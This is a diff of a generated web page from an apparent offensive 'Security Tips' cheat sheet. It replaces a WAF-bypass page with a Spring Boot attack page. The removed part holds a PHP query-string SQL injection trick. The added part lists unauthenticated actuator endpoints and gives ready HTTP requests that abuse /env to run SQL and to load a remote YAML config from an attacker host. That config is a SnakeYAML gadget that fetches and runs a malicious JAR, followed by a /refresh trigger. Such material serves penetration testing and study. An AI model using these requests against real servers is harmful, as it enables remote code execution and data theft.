@@ -8,14 +8,14 @@
   
   <meta name="author" content="Vincent D. (@vincd)">
   <link rel="shortcut icon" href="../img/favicon.ico">
-  <title>WAF - Security Tips</title>
+  <title>Spring Boot - Security Tips</title>
   <link rel="stylesheet" href="../css/style.css" type="text/css" />
   
   <script>
     // Current page data
-    var mkdocs_page_name = "WAF";
-    var mkdocs_page_input_path = "waf.md";
-    var mkdocs_page_url = "/waf/";
+    var mkdocs_page_name = "Spring Boot";
+    var mkdocs_page_input_path = "spring_boot.md";
+    var mkdocs_page_url = "/spring_boot/";
   </script>
   
   <script src="../js/jquery-2.1.1.min.js" defer></script>
@@ -225,24 +225,28 @@
                     
     <a class="section-link" href="../reverse-shell/">Reverse Shell</a>
                 </li>
-                <li class="">
-                    
-    <a class="section-link" href="../spring_boot/">Spring Boot</a>
-                </li>
                 <li class="active">
                     
-    <a class="section-link" href="./">WAF</a>
+    <a class="section-link" href="./">Spring Boot</a>
     <ul>
             
     
     <ul>
     
-        <li><a class="" href="#bypass-wef-in-php">Bypass WEF in PHP</a></li>
+        <li><a class="" href="#spring-boot-actuators-api">Spring Boot Actuators API</a></li>
+    
+        <li><a class="" href="#jolokia">Jolokia</a></li>
+    
+        <li><a class="" href="#env">Env</a></li>
     
     </ul>
     
 
     </ul>
+                </li>
+                <li class="">
+                    
+    <a class="section-link" href="../waf/">WAF</a>
                 </li>
                 <li class="">
                     
@@ -261,11 +265,68 @@
         <div role="main">
           <div class="section">
             
-              <h1 id="waf">WAF</h1>
-<h2 id="bypass-wef-in-php">Bypass WEF in PHP</h2>
-<p>From: https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/</p>
-<pre><code>/news.php?%20news[id%00=42&quot;+AND+1=0--
-/news.php?news_id=42
+              <h1 id="spring-boot">Spring Boot</h1>
+<h2 id="spring-boot-actuators-api">Spring Boot Actuators API</h2>
+<p>The Spring Boot Framework includes a bunch of features called <code>actuators</code> to monitor apps.
+When the application is running, it registers endpoints that are accessible without
+authentication.</p>
+<p>Here are some <code>actuators</code>:</p>
+<ul>
+<li><code>/dump</code>: displays a dump of threads (including a stack trace)</li>
+<li><code>/trace</code>: displays the last several HTTP messages (which could include session identifiers)</li>
+<li><code>/logfile</code>: outputs the contents of the log file</li>
+<li><code>/shutdown</code>: shuts the application down</li>
+<li><code>/mappings</code>: shows all of the MVC controller mappings</li>
+<li><code>/env</code>: provides access to the configuration environment</li>
+<li><code>/restart</code>: restarts the application</li>
+</ul>
+<p>For instance, it's possible to <a href="https://docs.spring.io/spring-boot/docs/current-SNAPSHOT/actuator-api/html/#heapdump" target="_blank">dump the heap memory</a>
+of the server:</p>
+<pre><code>https://&lt;host&gt;/path/actuator/heapdump
+</code></pre>
+
+<p>A brute-force list can be found here: <a href="../spring_boot.txt">spring_boot.txt</a></p>
+<h2 id="jolokia">Jolokia</h2>
+<p>An other Sping Boot endpoint is <code>jolokia</code>. It allow the user to perform the same
+actions as the JMX.</p>
+<pre><code>https://&lt;host&gt;/path/jolokia/list
+</code></pre>
+
+<p>It can be used to perform remote code execution.</p>
+<h2 id="env">Env</h2>
+<p>The <code>/env</code> endpoint allows to update the Spring Boot environmental properties.
+It's possible to execute SQL commands:</p>
+<pre><code>POST /env HTTP/1.1
+Host: &lt;host&gt;
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+
+spring.datasource.tomcat.validationQuery=&lt;sql cmd&gt;
+</code></pre>
+
+<p>Also, it's possible to update the <code>env</code> to execute code with the properties:
+<code>spring.cloud.bootstrap.location</code> which is used to load external configuration file:</p>
+<pre><code>POST /env HTTP/1.1
+Host: &lt;host&gt;
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+
+spring.cloud.bootstrap.location=http://&lt;attacker&gt;/malicious-config-file.yml
+</code></pre>
+
+<p>The malicious configuration file can be:</p>
+<pre><code>!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[
+    !!java.net.URL [&quot;http://&lt;attacker&gt;/malicious.jar&quot;]
+  ]]
+]
+</code></pre>
+
+<p>You need to refresh the configuration:</p>
+<pre><code>POST /refresh HTTP/1.1
+Host: &lt;host&gt;
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
 </code></pre>
             
           </div>
@@ -285,10 +346,10 @@
     <span class="rst-current-version" data-toggle="rst-current-version">
       
       
-        <span><a href="../spring_boot/" style="color: #fcfcfc;">&laquo; Previous</a></span>
+        <span><a href="../reverse-shell/" style="color: #fcfcfc;">&laquo; Previous</a></span>
       
       
-        <span style="margin-left: 15px"><a href="../miscs/" style="color: #fcfcfc">Next &raquo;</a></span>
+        <span style="margin-left: 15px"><a href="../waf/" style="color: #fcfcfc">Next &raquo;</a></span>
       
     </span>
 </div>
